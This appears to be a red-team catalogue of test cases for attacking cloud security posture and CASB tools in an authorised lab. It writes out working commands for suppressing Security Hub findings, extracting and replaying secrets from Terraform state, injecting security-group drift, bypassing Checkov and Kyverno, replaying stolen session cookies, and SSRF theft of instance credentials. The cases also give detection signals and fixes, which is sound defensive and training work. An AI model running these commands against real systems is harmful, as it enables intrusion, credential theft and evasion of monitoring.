# CSPM / CASB / CNAPP Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, an isolated lab (AWS Security Hub + Prowler + mock CASB, see `guides/cspm-casb-attack-playbook.md`), or an authorized target. Never run suppression or evasion commands against production without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. CSPM Presence Enumeration | 2 | LOW - MEDIUM |
| B. Coverage Gap Identification | 2 | MEDIUM |
| C. Rule Suppression Abuse | 2 | HIGH - CRITICAL |
| D. IaC State File Manipulation | 2 | HIGH - CRITICAL |
| E. Policy-as-Code Bypass | 2 | MEDIUM - HIGH |
| F. CASB Reverse Proxy Evasion & Shadow SaaS | 2 | HIGH - CRITICAL |
| G. Real-Incident Reconstruction | 1 | CRITICAL |
| **Total** | **13** | **LOW - CRITICAL** |

---

## A. CSPM Presence Enumeration

### TC-CP-001: AWS CSPM Presence Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-CP-001 |
| **Title** | Enumerate deployed CSPM/CNAPP tools in an AWS account |
| **Objective** | From a foothold in a target AWS account, identify which CSPM/CNAPP platforms are deployed (Security Hub, Wiz, Prisma Cloud, Lacework, Sysdig Secure, Orca), enumerate their IAM roles and configurations, and produce a presence matrix for downstream coverage-gap analysis. |
| **Steps** | 1. `aws iam list-roles --output text --query 'Roles[?contains(RoleName, \`Wiz\`) \|\| contains(RoleName, \`Prisma\`) \|\| contains(RoleName, \`Lacework\`) \|\| contains(RoleName, \`Sysdig\`) \|\| contains(RoleName, \`Orca\`) \|\| contains(RoleName, \`Prowler\`)].[RoleName, Arn]'` and document findings.<br>2. `aws securityhub describe-hub --region us-east-1` -- record whether Security Hub is enabled.<br>3. `aws securityhub get-enabled-standards --region us-east-1` -- list enabled standards (CIS, AWS Foundational, PCI DSS, NIST).<br>4. `aws configservice describe-configuration-recorders` -- check AWS Config foundation.<br>5. `aws guardduty list-detectors --region us-east-1` -- enumerate GuardDuty (runtime detection layer).<br>6. `aws cloudtrail describe-trails --query 'trailList[*].[Name, S3BucketName, IsMultiRegionTrail]'` -- identify CloudTrail trails (most CSPMs ingest from CloudTrail).<br>7. Compile a presence matrix: tool x enabled-y/n x regions x IAM role ARN. |
| **Expected Result** | A documented presence matrix identifying which CSPM/CNAPP tools are deployed, their IAM roles, their enabled standards, and the regions they cover. Empty entries in the matrix identify coverage gaps for downstream exploitation. |
| **Tools** | awscli, jq |
| **MITRE** | T1068, T1580 (Cloud Infrastructure Discovery) |
| **Difficulty** | LOW |
| **Tags** | cspm, presence, enumeration, aws, security-hub |

---

### TC-CP-002: Azure & GCP CSPM Presence Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-CP-002 |
| **Title** | Enumerate Microsoft Defender for Cloud and GCP Security Command Center deployments |
| **Objective** | From a foothold in a target Azure subscription or GCP org, identify whether Microsoft Defender for Cloud (Azure) or Security Command Center (GCP) is enabled, which pricing tiers apply, and which third-party CSPM roles / service accounts exist. |
| **Steps** | 1. Azure: `az security pricing show --name VirtualMachines` and `--name StorageAccounts` and `--name KubernetesService` -- record Standard vs Free tier.<br>2. Azure: `az security regulatory-compliance-assessments list -o table` -- list compliance standards applied.<br>3. Azure: `az policy assignment list -o table` -- list Azure Policy assignments, filter for CSPM-linked definitions.<br>4. GCP: `gcloud scc describe --organization=REPLACE_WITH_YOUR_ORG_ID` -- check SCC enablement and tier (Standard / Premium).<br>5. GCP: `gcloud scc findings list REPLACE_WITH_YOUR_ORG_ID --filter="event_time > \"$(date -d '7 days ago' -u +%Y-%m-%dT%H:%M:%SZ)\""` -- sample recent findings (confirms SCC is active).<br>6. GCP: enumerate service accounts matching CSPM patterns (`gcloud iam service-accounts list | grep -iE 'wiz\|prisma\|lacework'`).<br>7. Document a presence matrix per provider. |
| **Expected Result** | Presence matrix for Azure (Defender for Cloud tiers, regulatory standards, policy assignments) and GCP (SCC tier, recent findings volume, CSPM service accounts). |
| **Tools** | azure-cli, gcloud |
| **MITRE** | T1068, T1580 |
| **Difficulty** | MEDIUM |
| **Tags** | cspm, presence, enumeration, azure, gcp, defender-for-cloud, scc |

---

## B. Coverage Gap Identification

### TC-CP-003: Prowler Coverage Matrix Construction

| Field | Value |
|------|-----|
| **ID** | TC-CP-003 |
| **Title** | Build a coverage matrix from Prowler's check list and identify blind spots |
| **Objective** | Enumerate every Prowler check, group by AWS service, and produce a list of AWS services with no Prowler coverage. These uncovered services are CSPM blind spots the red team can plan attack paths around. |
| **Steps** | 1. `prowler aws --list-checks \| sort -u > prowler-checks.txt` and verify line count (~300 checks).<br>2. `awk -F_ '{print $2}' prowler-checks.txt \| sort \| uniq -c \| sort -rn > prowler-services.txt` to group checks by service.<br>3. Manually compare `prowler-services.txt` against the AWS service catalog (https://docs.aws.amazon.com/serviceindex/) and identify services with zero coverage.<br>4. For each uncovered service, document whether the service is GA and commonly used (e.g., AWS Q, Amazon Bedrock for newer services; AWS Glue, Amazon MSK for older services).<br>5. Produce a final blind-spots list (services with zero Prowler coverage AND commonly used). |
| **Expected Result** | A documented blind-spots list identifying AWS services with no Prowler coverage. Each entry includes: service name, GA year, common use cases, and an example attack primitive that traverses the service (e.g., "Bedrock knowledge bases: data exfil via query API, not tracked as a graph edge by most CSPMs"). |
| **Tools** | prowler, jq, awk |
| **MITRE** | T1068 |
| **Difficulty** | MEDIUM |
| **Tags** | coverage-gap, prowler, matrix, blind-spots |

---

### TC-CP-004: CNAPP Graph Schema Coverage Analysis

| Field | Value |
|------|-----|
| **ID** | TC-CP-004 |
| **Title** | Query a CNAPP's graph schema to identify unmodelled resources |
| **Objective** | Using a compromised Wiz service account (mock credentials in the lab), query the GraphQL schema endpoint, extract every modelled entity type, and identify resources not in the schema (newly-GA services, alpha-region resources, custom resources). |
| **Steps** | 1. Decode the Wiz JWT and extract the endpoint: `echo "$WIZ_JWT" \| cut -d. -f2 \| base64 -d 2>/dev/null \| jq '.'`.<br>2. Query the schema: `curl -s "$WIZ_ENDPOINT/graphql" -H "Authorization: Bearer $WIZ_JWT" -H 'Content-Type: application/json' --data '{"query":"query { graphSchema { entities { name categories } } }"}' \| jq -r '.data.graphSchema.entities[].name' \| sort > wiz-entities.txt`.<br>3. Line count `wc -l wiz-entities.txt` (expect ~1000 entity types).<br>4. Identify newer AWS services not in the schema: `grep -iE 'bedrock\|q_\|entityresolution\|appfabric\|cleanrooms' wiz-entities.txt \|\| echo "blind spot found"`.<br>5. Pick one blind-spot service and craft an attack primitive (e.g., if Bedrock is unmodelled, exfil via a Bedrock knowledge base query: `aws bedrock-agent-runtime retrieve --knowledge-base-id REPLACE_WITH_YOUR_KB_ID --retrieval-query '{"query": "all customer PII"}'`).<br>6. Document: blind-spot resource, attack primitive, why the CNAPP misses it. |
| **Expected Result** | A list of CNAPP graph blind spots (services not modelled), each with a documented attack primitive and an explanation of why the CNAPP misses it (schema freshness, resource type unsupported, region unsupported). |
| **Tools** | curl, jq, awscli |
| **MITRE** | T1068, T1580 |
| **Difficulty** | MEDIUM |
| **Tags** | cnapp, graph-schema, wiz, blind-spots |

---

## C. Rule Suppression Abuse

### TC-CP-005: AWS Security Hub Finding Suppression

| Field | Value |
|------|-----|
| **ID** | TC-CP-005 |
| **Title** | Suppress a Security Hub finding via BatchUpdateFindings |
| **Objective** | Demonstrate the primitive of suppressing a Security Hub finding (T1565.001 -- Adversary-Inhibited Response System), verify the suppression is effective, and document the audit trail the defender could have used to detect it. |
| **Steps** | 1. Identify a target finding: `aws securityhub get-findings --region us-east-1 --filters 'ResourceAwsEc2InstanceId=[{Value="REPLACE_WITH_YOUR_INSTANCE_ID",Comparison="EQUALS"}]' --query 'Findings[0].[Id, ProductArn]' --output text`.<br>2. Suppress: `aws securityhub batch-update-findings --region us-east-1 --finding-identifiers Id="$FINDING_ID",ProductArn="$PRODUCT_ARN" --note "investigated per policy REPLACE_WITH_YOUR_POLICY_ID" --workflow Status=SUPPRESSED`.<br>3. Verify: `aws securityhub get-findings --region us-east-1 --filters "Id=[{Value=\"$FINDING_ID\",Comparison=\"EQUALS\"}]" --query 'Findings[0].Workflow.Status'` -- must return `SUPPRESSED`.<br>4. Audit trail (defender perspective): `aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchUpdateFindings --region us-east-1 --query 'Events[*].[EventTime, Username]' --output text`.<br>5. Document the suppression primitive, the verification, and the detection signal. |
| **Expected Result** | The finding's workflow status transitions from `NEW` to `SUPPRESSED` after the BatchUpdateFindings call, and the CloudTrail audit log contains a `BatchUpdateFindings` event with the suppressing user identity. |
| **Tools** | awscli, jq |
| **MITRE** | T1565.001 (Inhibit System Response -- Storage/Data) |
| **Difficulty** | HIGH |
| **Tags** | suppression, security-hub, batch-update-findings, audit |

---

### TC-CP-006: Tag-Based Suppression Discovery & Abuse

| Field | Value |
|------|-----|
| **ID** | TC-CP-006 |
| **Title** | Discover and abuse a tag-based suppression pattern in a CSPM |
| **Objective** | Identify the magic tag key/value the target CSPM uses for suppression (via reading suppressed findings or CSPM config), apply the tag to an attacker-controlled resource, and verify the resource no longer generates findings. |
| **Steps** | 1. Enumerate suppressed findings: `aws securityhub get-findings --region us-east-1 --filters 'WorkflowStatus=[{Value="SUPPRESSED",Comparison="EQUALS"}]' --query 'Findings[*].ResourceTags' --output json`. Look for common tags across suppressed findings.<br>2. Identify the magic tag (common patterns: `security-exemption=approved`, `cspm-suppress=true`, `wiz-ignore=<rule-id>`, `breakglass=<change-id>`).<br>3. Apply the tag to an attacker resource: `aws ec2 create-tags --resources REPLACE_WITH_YOUR_INSTANCE_ID --tags 'Key=REPLACE_WITH_DETECTED_TAG_KEY,Value=REPLACE_WITH_DETECTED_TAG_VALUE'`.<br>4. Trigger a misconfig on the resource (e.g., open SSH to 0.0.0.0/0 in a security group) that would normally generate a HIGH severity finding.<br>5. Wait for the CSPM scan cycle (typically 5-30 min for real-time, hours for point-in-time).<br>6. Verify no new finding was generated: `aws securityhub get-findings --region us-east-1 --filters "ResourceTags=[{Key=\"REPLACE_WITH_DETECTED_TAG_KEY\",Value=\"REPLACE_WITH_DETECTED_TAG_VALUE\",Comparison=\"EQUALS\"}],WorkflowStatus=[{Value=\"NEW\",Comparison=\"EQUALS\"}]" --query 'Findings'`.<br>7. Document the magic tag, the suppression, and the audit signal (CloudTrail CreateTags event with the magic tag value). |
| **Expected Result** | A misconfiguration on the tagged resource does NOT generate a NEW finding in the CSPM, demonstrating that the magic tag-based suppression is effective. The CloudTrail audit log contains a CreateTags event with the magic tag value (the detection signal). |
| **Tools** | awscli, jq |
| **MITRE** | T1565.001, T1530 (Data from Cloud Storage) |
| **Difficulty** | HIGH |
| **Tags** | tag-suppression, cspm-abuse, audit |

---

## D. IaC State File Manipulation

### TC-CP-007: Terraform State File Secret Extraction

| Field | Value |
|------|-----|
| **ID** | TC-CP-007 |
| **Title** | Locate, scan, and extract secrets from a Terraform state file |
| **Objective** | Locate a Terraform state file in a compromised environment, scan it for embedded secrets, and extract credentials that grant further access. |
| **Steps** | 1. Locate state files: `find / -name '*.tfstate' 2>/dev/null` and `find / -name 'terraform.tfstate*' 2>/dev/null`.<br>2. Check S3 backends: `aws s3api list-buckets --query 'Buckets[*].Name' --output text \| tr '\t' '\n' \| xargs -I{} sh -c 'aws s3 ls s3://{} --recursive 2>/dev/null \| grep -i tfstate'`.<br>3. Scan with trufflehog: `trufflehog filesystem ./terraform.tfstate --only-verified`.<br>4. Manual inspection: `jq '.resources[].instances[].attributes \| with_entries(select(.key \| test("password\|secret\|token\|key"; "i"))) \| select(length > 0)' terraform.tfstate`.<br>5. Identify high-value secrets (RDS master passwords, IAM access keys, API tokens).<br>6. Replay: test each credential against the corresponding service (e.g., RDS password via psql, IAM key via awscli).<br>7. Document the secrets found and their blast radius. |
| **Expected Result** | At least one valid credential extracted from the state file, with documented blast radius (e.g., "RDS master password granting access to REPLACE_WITH_YOUR_DB_NAME; IAM access key granting REPLACE_WITH_YOUR_ROLE_NAME"). |
| **Tools** | trufflehog, jq, find, awscli |
| **MITRE** | T1552 (Unsecured Credentials) |
| **Difficulty** | HIGH |
| **Tags** | terraform-state, secrets, trufflehog |

---

### TC-CP-008: Terraform State Drift Injection

| Field | Value |
|------|-----|
| **ID** | TC-CP-008 |
| **Title** | Inject drift into a Terraform state file and propagate to live infrastructure |
| **Objective** | Modify a Terraform state file to inject a misconfiguration (e.g., add a public ingress rule to a security group), then run `terraform apply` via a compromised CI identity to propagate the drift to live infrastructure as a managed change. |
| **Steps** | 1. Snapshot the state: `cp terraform.tfstate terraform.tfstate.bak`.<br>2. Modify the state to add a public ingress rule: `jq '.resources[] \| select(.type=="aws_security_group" and .name=="allow_ingress") \| .instances[0].attributes.ingress += [{"cidr_blocks": ["0.0.0.0/0"], "from_port": 22, "protocol": "tcp", "to_port": 22, "description": "internal admin"}]' terraform.tfstate > terraform.tfstate.new && mv terraform.tfstate.new terraform.tfstate`.<br>3. Verify the state now describes the drift: `terraform plan` -- expect a no-op or a small drift-detection result.<br>4. Apply the drift: `terraform apply -auto-approve` (using the compromised CI identity's creds).<br>5. Verify live infra: `aws ec2 describe-security-groups --group-ids REPLACE_WITH_YOUR_SG_ID --query 'SecurityGroups[0].IpPermissions'` -- expect 0.0.0.0/0 on port 22.<br>6. Check the CSPM: does it generate a finding? If yes, the drift did NOT evade the CSPM. If no (the change is treated as "managed by Terraform"), the drift evaded.<br>7. Document the drift injection, the apply, and whether the CSPM flagged it. |
| **Expected Result** | A public ingress rule is added to the security group in live infrastructure, propagated via `terraform apply`. If the CSPM does NOT generate a finding within its scan cycle, the drift injection evaded the CSPM -- documenting a coverage gap. |
| **Tools** | jq, terraform, awscli |
| **MITRE** | T1565.001, T1578 (Modify Cloud Compute Infrastructure) |
| **Difficulty** | CRITICAL |
| **Tags** | terraform-state, drift-injection, ci-compromise |

---

## E. Policy-as-Code Bypass

### TC-CP-009: Checkov Skip-Comment Bypass

| Field | Value |
|------|-----|
| **ID** | TC-CP-009 |
| **Title** | Bypass Checkov checks via inline skip comments in a Terraform resource |
| **Objective** | Demonstrate that an attacker with write access to a Terraform repo can bypass Checkov's CI gate by adding inline skip comments to the offending resource, and document the detection signal for the defender. |
| **Steps** | 1. Identify a resource that would fail Checkov: `checkov -d . --framework terraform --output cli`. Note the failing CKV IDs.<br>2. Add skip comments to the resource: append lines like `# checkov:skip=CKV_AWS_18:internal-only` for each failing CKV ID.<br>3. Re-run: `checkov -d . --framework terraform --quiet` -- expect zero findings on the resource.<br>4. Detection signal (defender perspective): `grep -rn 'checkov:skip' .` lists every skip comment in the repo.<br>5. Document the bypass, the failing CKV IDs that were skipped, and the detection signal. |
| **Expected Result** | The Checkov CI gate passes (zero findings) on the resource after adding skip comments. The `grep -rn 'checkov:skip' .` command lists every bypass instance as the defender's detection signal. |
| **Tools** | checkov, grep |
| **MITRE** | T1565.001 |
| **Difficulty** | MEDIUM |
| **Tags** | checkov, skip-comment, policy-bypass |

---

### TC-CP-010: Kyverno Policy Bypass via Namespace Scoping

| Field | Value |
|------|-----|
| **ID** | TC-CP-010 |
| **Title** | Bypass a namespace-scoped Kyverno policy by deploying to an unscoped namespace |
| **Objective** | Demonstrate that namespace-scoped Kyverno policies are bypassed by deploying attacker resources to a namespace not in the policy's match list, and document the fix (enforce the policy cluster-wide). |
| **Steps** | 1. Read the target Kyverno policy: `kubectl get clusterpolicy.kyverno.io REPLACE_WITH_YOUR_POLICY -o yaml` and note the `match.any.resources.namespaces` field.<br>2. Create a shadow namespace: `kubectl create namespace REPLACE_WITH_YOUR_SHADOW_NAMESPACE`.<br>3. Deploy the malicious resource to the shadow namespace: `kubectl apply -f malicious-pod.yaml -n REPLACE_WITH_YOUR_SHADOW_NAMESPACE`.<br>4. Verify the resource was admitted (no Kyverno block).<br>5. Fix (defender): remove the namespace scope from the policy (`match.any.resources.namespaces: []`) so it applies cluster-wide.<br>6. Re-test: the resource should now be blocked.<br>7. Document the bypass, the shadow-namespace tactic, and the cluster-wide enforcement fix. |
| **Expected Result** | A malicious resource is admitted to the shadow namespace (bypass succeeded). After the defender removes the namespace scope, the same resource is blocked by Kyverno. |
| **Tools** | kubectl, kyverno |
| **MITRE** | T1565.001 |
| **Difficulty** | MEDIUM |
| **Tags** | kyverno, namespace-scope, policy-bypass |

---

## F. CASB Reverse Proxy Evasion & Shadow SaaS

### TC-CP-011: Direct-to-Origin SaaS API Bypass

| Field | Value |
|------|-----|
| **ID** | TC-CP-011 |
| **Title** | Bypass a CASB reverse proxy by calling the SaaS API directly |
| **Objective** | Identify that a SaaS app is brokered by a CASB (via TLS cert inspection), discover the real SaaS API endpoint, and call the API directly to bypass the broker's DLP and access policies. |
| **Steps** | 1. Identify the broker: `dig +short app.example.com` -- if it returns `*.mcas.ms` (Microsoft), `*.netskope.com`, or `*.zscaler.net`, the app is brokered.<br>2. Discover the real SaaS API endpoint: `dig +short app.example.com A` (skip the CNAME) or read the SaaS provider's public API docs.<br>3. Attempt a direct call: `curl -H "Authorization: Bearer $SAAS_JWT" https://app.example.com/api/v1/files --resolve app.example.com:443:REAL_IP`.<br>4. If the JWT is broker-mediated (OAuth scope restricted to the broker), use a session cookie copied from a corporate device instead: extract via `sqlite3 /tmp/exfil/Cookies 'SELECT host_key, name, value FROM cookies WHERE host_key LIKE "%.example.com"'`.<br>5. Replay the cookie: `curl -H "Cookie: SESSION=$STOLEN_COOKIE" https://app.example.com/api/v1/files`.<br>6. Verify the call succeeded (HTTP 200 with data) -- the CASB was bypassed.<br>7. Document: broker identified, real API endpoint, the credential used for the bypass, and whether the SaaS provider logged the direct-access event. |
| **Expected Result** | A direct-to-origin SaaS API call succeeds (HTTP 200 with data), bypassing the CASB broker. The SaaS provider's audit log (if accessible) shows a direct API call from the attacker IP, not from the broker IP range -- the detection signal. |
| **Tools** | dig, curl, sqlite3, mitmproxy |
| **MITRE** | T1557 (Adversary-in-the-Middle), T1528 (Steal Application Access Token) |
| **Difficulty** | HIGH |
| **Tags** | casb, direct-to-origin, saas, bypass |

---

### TC-CP-012: Shadow SaaS Discovery via DNS Analysis

| Field | Value |
|------|-----|
| **ID** | TC-CP-012 |
| **Title** | Discover unmanaged SaaS apps via DNS analysis on a corporate device |
| **Objective** | Capture DNS queries on a compromised corporate device, identify SaaS domains not on the CASB's brokered app list, and document them as shadow SaaS targets for follow-on token theft or OAuth-grant abuse. |
| **Steps** | 1. Start a DNS capture: `sudo tcpdump -i any -n 'port 53' -w dns.pcap &`.<br>2. After 1 hour of corporate user activity, stop the capture and extract domains: `tcpdump -r dns.pcap -n \| awk '/A\?/ {print $NF}' \| sort -u \| grep -vE '\.(corp\|internal)\.' > saas-domains.txt`.<br>3. Get the brokered app list (from the CASB admin console or the corporate PAC file): `curl -s https://pac.zscalerbeta.net/REPLACE_WITH_YOUR_PAC_ID/zscaler.pac \| grep -oE 'https?://[^/]+' \| sort -u > brokered-apps.txt`.<br>4. Diff: `comm -23 saas-domains.txt brokered-apps.txt > shadow-saas.txt`.<br>5. Identify high-value shadow SaaS: `grep -iE 'linkedin\|github\|notion\|figma\|openai\|anthropic\|gemini\|pastebin' shadow-saas.txt`.<br>6. For each high-value app, look for OAuth grants in the corporate tenant: `az ad sp list --query '[?appDisplayName==\`LinkedIn\`]'` (Azure) or check GitHub OAuth apps via `gh api orgs/REPLACE_WITH_YOUR_ORG/installations`.<br>7. Document the shadow SaaS list with OAuth grant status. |
| **Expected Result** | A list of shadow SaaS apps (unmanaged by the CASB), each annotated with OAuth grant status. High-value findings (e.g., corporate GitHub org with broad OAuth grants to third-party apps) become follow-on targets. |
| **Tools** | tcpdump, curl, jq, gh, azure-cli |
| **MITRE** | T1213 (Data from Information Repositories), T1528 |
| **Difficulty** | HIGH |
| **Tags** | shadow-saas, dns, oauth, casb-gap |

---

## G. Real-Incident Reconstruction

### TC-CP-013: Capital One Breach CSPM Bypass Reconstruction

| Field | Value |
|------|-----|
| **ID** | TC-CP-013 |
| **Title** | Reconstruct the Capital One (2019) CSPM coverage gap in a lab |
| **Objective** | Reproduce the Capital One attack chain (SSRF -> IMDSv1 -> role creds -> S3 listing) in a lab, identify which Security Hub controls SHOULD have caught it, and document why the alert was ignored (alert fatigue + insufficient severity). |
| **Steps** | 1. Lab setup: AWS account with an EC2 instance running a vulnerable web app (SSRF sink), Security Hub enabled with CIS AWS Foundations Benchmark standard.<br>2. Trigger SSRF to IMDSv1: `curl -s "http://LAB-APP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/REPLACE_WITH_YOUR_ROLE_NAME"`. Document the IMDSv1 response.<br>3. Use the stolen creds to list S3: `AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... aws s3 ls`.<br>4. Identify Security Hub controls that SHOULD have fired: `EC2.11` (no IMDSv1), `S3.4` (S3 public access blocked), `IAM.7` (no wildcard in policies).<br>5. Check Security Hub: `aws securityhub get-findings --region us-east-1 --filters 'ComplianceStatus=[{Value="FAILED",Comparison="EQUALS"}]' --query 'Findings[*].[Title, Severity.Label]' --output text`.<br>6. Document the alert fatigue signal: at Capital One scale (thousands of instances), Security Hub generated thousands of findings; the IMDSv1 control's severity (MEDIUM) was insufficient to drive remediation.<br>7. Document the modern detection: IMDSv2 enforcement (`aws ec2 modify-instance-metadata-options --instance-id REPLACE_WITH_YOUR_INSTANCE_ID --http-tokens required`) closes the gap. |
| **Expected Result** | The SSRF -> IMDSv1 -> role creds -> S3 listing chain completes successfully in the lab. Security Hub shows the IMDSv1 finding at MEDIUM severity. The reconstruction documents why the finding was ignored in production and the modern IMDSv2 enforcement that closes the gap. |
| **Tools** | awscli, curl, Security Hub |
| **MITRE** | T1210 (Exploitation of Remote Services), T1552 (Unsecured Credentials), T1530 (Data from Cloud Storage) |
| **Difficulty** | CRITICAL |
| **Tags** | capital-one, ssrf, imdsv1, security-hub, alert-fatigue |

---

## H. Lab Setup Verification

### TC-CP-014 (bonus): Mock CASB + Prowler Lab Build

| Field | Value |
|------|-----|
| **ID** | TC-CP-014 |
| **Title** | Stand up a complete lab environment for CSPM/CASB attack testing |
| **Objective** | Build a complete lab: AWS Security Hub + Prowler (pushing findings), a mock Wiz GraphQL endpoint, and a mock CASB reverse proxy via mitmproxy -- to safely exercise every TC-CP-001..013 test case. |
| **Steps** | 1. Enable Security Hub: `aws securityhub enable-import-findings-for-product --product-arn arn:aws:securityhub:us-east-1:REPLACE_WITH_YOUR_ACCOUNT:product/default/default`.<br>2. Run Prowler and push findings: `prowler aws -p default -M json --security-hub -o /tmp/prowler-out/`.<br>3. Verify Prowler findings in Security Hub: `aws securityhub get-findings --filters 'ProductName=[{Value="Prowler",Comparison="EQUALS"}]' --query 'Findings[*].Title' --output text \| head -10`.<br>4. Stand up a mock Wiz GraphQL endpoint (Apollo Server on port 4000): `cd mock-wiz-api && npm install && npm start`. Test with `curl -s http://127.0.0.1:4000/graphql --data '{"query":"{ assets(first: 10) { nodes { id name } } }"}' \| jq`.<br>5. Stand up a mock CASB reverse proxy: `mitmweb --mode reverse:https://app.example.com --listen-port 8443 --web-port 8081 --ssl-insecure`.<br>6. Test the CASB proxy: `curl --proxy http://127.0.0.1:8080 https://app.example.com/api/v1/files` -- traffic should appear in the mitmweb UI.<br>7. Document the lab as ready and reference it for TC-CP-001..013. |
| **Expected Result** | A complete lab with Security Hub ingesting Prowler findings, a mock Wiz GraphQL endpoint responding to queries, and a mock CASB reverse proxy intercepting TLS traffic. Each component verified with a basic query/curl. |
| **Tools** | awscli, prowler, mitmproxy, npm |
| **MITRE** | (lab setup; not a direct attack technique) |
| **Difficulty** | LOW |
| **Tags** | lab-setup, mock-casb, mock-wiz, prowler, security-hub |
